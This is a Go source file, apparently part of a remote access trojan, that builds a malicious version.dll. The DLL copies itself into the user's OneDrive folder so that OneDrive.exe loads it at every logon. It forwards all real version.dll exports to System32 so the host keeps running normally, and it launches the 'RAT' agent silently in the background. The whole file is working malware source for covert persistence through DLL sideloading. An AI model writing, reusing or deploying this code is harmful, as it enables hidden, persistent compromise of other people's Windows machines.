//go:build dll && windows

package main

/*
#include <windows.h>

// getOwnModule returns the HMODULE of this DLL using the address of this
// C function, which lives inside the DLL's .text section.
static HMODULE getOwnModule() {
	HMODULE hm = NULL;
	GetModuleHandleExW(
		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		(LPCWSTR)getOwnModule,
		&hm
	);
	return hm;
}

// getOwnPath writes this DLL's full path into buf and returns the length.
static int getOwnPath(wchar_t *buf, int bufLen) {
	HMODULE hm = getOwnModule();
	if (!hm) return 0;
	return (int)GetModuleFileNameW(hm, buf, (DWORD)bufLen);
}
*/
import "C"

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

// ================================================================
// SIDELOAD TARGET — OneDrive.exe (present on all Win10/11, user-space)
//
// OneDrive.exe lives at %LOCALAPPDATA%\Microsoft\OneDrive\ and
// auto-starts on logon. It loads version.dll from its own directory
// before falling back to System32, which lets us proxy the real DLL
// while running our payload in the background.
//
// Stage 1: rundll32.exe payload.dll,EntryPoint
//   → copies self to OneDrive dir as version.dll
//   → runs RAT immediately
//
// Stage 2: OneDrive.exe starts on next logon
//   → loads our version.dll (persistence)
//   → proxy forwards API calls to real System32\version.dll
//   → RAT runs in background goroutine
// ================================================================

const (
	sideloadHostApp = "OneDrive.exe"
	sideloadDLLName = "version.dll"
)

func sideloadDir() string {
	return filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "OneDrive")
}

// ================================================================
// VERSION.DLL PROXY — forward all exports to the real System32 DLL
// ================================================================

var realVersionHandle syscall.Handle

func initRealVersion() {
	sysRoot := os.Getenv("SYSTEMROOT")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	p := filepath.Join(sysRoot, "System32", "version.dll")
	h, err := syscall.LoadLibrary(p)
	if err == nil {
		realVersionHandle = h
	}
}

func fwdProc(name string) uintptr {
	if realVersionHandle == 0 {
		return 0
	}
	p, _ := syscall.GetProcAddress(realVersionHandle, name)
	return p
}

// --- GetFileVersionInfo family ---

//export GetFileVersionInfoA
func GetFileVersionInfoA(a1, a2, a3, a4 uintptr) uintptr {
	if p := fwdProc("GetFileVersionInfoA"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4)
		return r
	}
	return 0
}

//export GetFileVersionInfoW
func GetFileVersionInfoW(a1, a2, a3, a4 uintptr) uintptr {
	if p := fwdProc("GetFileVersionInfoW"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4)
		return r
	}
	return 0
}

//export GetFileVersionInfoByHandle
func GetFileVersionInfoByHandle(a1, a2, a3, a4 uintptr) uintptr {
	if p := fwdProc("GetFileVersionInfoByHandle"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4)
		return r
	}
	return 0
}

// --- GetFileVersionInfoEx family ---

//export GetFileVersionInfoExA
func GetFileVersionInfoExA(a1, a2, a3, a4, a5 uintptr) uintptr {
	if p := fwdProc("GetFileVersionInfoExA"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5)
		return r
	}
	return 0
}

//export GetFileVersionInfoExW
func GetFileVersionInfoExW(a1, a2, a3, a4, a5 uintptr) uintptr {
	if p := fwdProc("GetFileVersionInfoExW"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5)
		return r
	}
	return 0
}

// --- GetFileVersionInfoSize family ---

//export GetFileVersionInfoSizeA
func GetFileVersionInfoSizeA(a1, a2 uintptr) uintptr {
	if p := fwdProc("GetFileVersionInfoSizeA"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeW
func GetFileVersionInfoSizeW(a1, a2 uintptr) uintptr {
	if p := fwdProc("GetFileVersionInfoSizeW"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeExA
func GetFileVersionInfoSizeExA(a1, a2, a3 uintptr) uintptr {
	if p := fwdProc("GetFileVersionInfoSizeExA"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3)
		return r
	}
	return 0
}

//export GetFileVersionInfoSizeExW
func GetFileVersionInfoSizeExW(a1, a2, a3 uintptr) uintptr {
	if p := fwdProc("GetFileVersionInfoSizeExW"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3)
		return r
	}
	return 0
}

// --- VerFindFile ---

//export VerFindFileA
func VerFindFileA(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
	if p := fwdProc("VerFindFileA"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5, a6, a7, a8)
		return r
	}
	return 0
}

//export VerFindFileW
func VerFindFileW(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
	if p := fwdProc("VerFindFileW"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5, a6, a7, a8)
		return r
	}
	return 0
}

// --- VerInstallFile ---

//export VerInstallFileA
func VerInstallFileA(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
	if p := fwdProc("VerInstallFileA"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5, a6, a7, a8)
		return r
	}
	return 0
}

//export VerInstallFileW
func VerInstallFileW(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
	if p := fwdProc("VerInstallFileW"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5, a6, a7, a8)
		return r
	}
	return 0
}

// --- VerLanguageName ---

//export VerLanguageNameA
func VerLanguageNameA(a1, a2, a3 uintptr) uintptr {
	if p := fwdProc("VerLanguageNameA"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3)
		return r
	}
	return 0
}

//export VerLanguageNameW
func VerLanguageNameW(a1, a2, a3 uintptr) uintptr {
	if p := fwdProc("VerLanguageNameW"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3)
		return r
	}
	return 0
}

// --- VerQueryValue ---

//export VerQueryValueA
func VerQueryValueA(a1, a2, a3, a4 uintptr) uintptr {
	if p := fwdProc("VerQueryValueA"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4)
		return r
	}
	return 0
}

//export VerQueryValueW
func VerQueryValueW(a1, a2, a3, a4 uintptr) uintptr {
	if p := fwdProc("VerQueryValueW"); p != 0 {
		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4)
		return r
	}
	return 0
}

// ================================================================
// SELF-PATH RESOLUTION (via CGO GetModuleFileName)
// ================================================================

func getSelfDLLPath() string {
	buf := make([]uint16, 512)
	n := int(C.getOwnPath((*C.wchar_t)(unsafe.Pointer(&buf[0])), 512))
	if n <= 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:n])
}

// ================================================================
// SIDELOAD INSTALLER — copies this DLL to OneDrive directory
// ================================================================

func performSideload() string {
	selfPath := getSelfDLLPath()
	if selfPath == "" {
		return "Sideload failed: cannot determine DLL path"
	}

	targetDir := sideloadDir()
	targetPath := filepath.Join(targetDir, sideloadDLLName)

	// Already at the target location — nothing to do
	if strings.EqualFold(selfPath, targetPath) {
		return "Already sideloaded"
	}

	// Verify host app exists (OneDrive should be installed)
	hostExe := filepath.Join(targetDir, sideloadHostApp)
	if _, err := os.Stat(hostExe); err != nil {
		return fmt.Sprintf("Sideload target not found: %s", hostExe)
	}

	os.MkdirAll(targetDir, 0755)

	src, err := os.Open(selfPath)
	if err != nil {
		return fmt.Sprintf("Sideload read error: %v", err)
	}
	defer src.Close()

	dst, err := os.Create(targetPath)
	if err != nil {
		return fmt.Sprintf("Sideload write error: %v", err)
	}
	defer dst.Close()

	if _, err = io.Copy(dst, src); err != nil {
		return fmt.Sprintf("Sideload copy error: %v", err)
	}

	return fmt.Sprintf("Sideloaded to %s (persistence via %s)", targetPath, sideloadHostApp)
}

func removeSideload() string {
	targetPath := filepath.Join(sideloadDir(), sideloadDLLName)
	if err := os.Remove(targetPath); err != nil && !os.IsNotExist(err) {
		return fmt.Sprintf("Sideload removal failed: %v", err)
	}
	return "Sideload removed"
}

// ================================================================
// SIDELOAD COMMAND STUBS (called from handleCommand in main.go)
// ================================================================

func installSideload() string {
	return performSideload()
}

func uninstallSideload() string {
	return removeSideload()
}

// ================================================================
// DLL ENTRY POINTS
// ================================================================

//export EntryPoint
func EntryPoint() {
	// Stage 1: called via rundll32.exe payload.dll,EntryPoint
	// Copy ourselves to OneDrive dir for persistence, then run the RAT.
	performSideload()
	runAgent()
}

func init() {
	// Always set up version.dll proxy so the host app doesn't crash
	initRealVersion()

	// Detect the host process to decide behavior
	exe, _ := os.Executable()
	exeName := strings.ToLower(filepath.Base(exe))

	if exeName != "rundll32.exe" {
		// Stage 2: loaded by OneDrive.exe (or another host) via DLL search order
		// Run RAT in background goroutine so the host app continues normally
		go runAgent()
	}
	// If rundll32: proxy is ready, wait for EntryPoint() call
}

// main is required by -buildmode=c-shared but never called
func main() {}
